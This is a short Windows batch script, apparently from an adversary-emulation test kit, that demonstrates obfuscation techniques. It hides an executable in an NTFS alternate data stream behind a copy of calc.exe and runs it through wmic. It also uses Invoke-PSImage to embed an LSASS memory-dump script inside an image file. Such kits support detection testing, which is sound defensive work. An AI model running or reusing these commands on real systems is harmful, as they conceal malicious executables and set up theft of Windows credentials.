@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Obfuscated Files or Information	(T1028)
ECHO.
ECHO [+] Using Executable in ADS
ECHO -------------------------------------------------------------------
cmd /c copy c:\windows\system32\calc.exe %Utilities%\calc.exe
cmd /c type %Utilities%al-khaser.exe > %Utilities%\calc.exe:al-khaser.exe
cmd /c wmic process call create "%Utilities%\calc.exe:al-khaser.exe"
ECHO.

ECHO [+] Using Powershell (Embed a powershell script winth the pixels of an image)
ECHO -------------------------------------------------------------------

powershell import-module %PAYLOAD%\T1027\Invoke-PSImage.ps1;Invoke-PSImage -script %PAYLOAD%\T1003\LSASS_Memory_Dump.ps1 -out %Utilities%\evil.png -image %Utilities%\joker.jpg
ECHO.

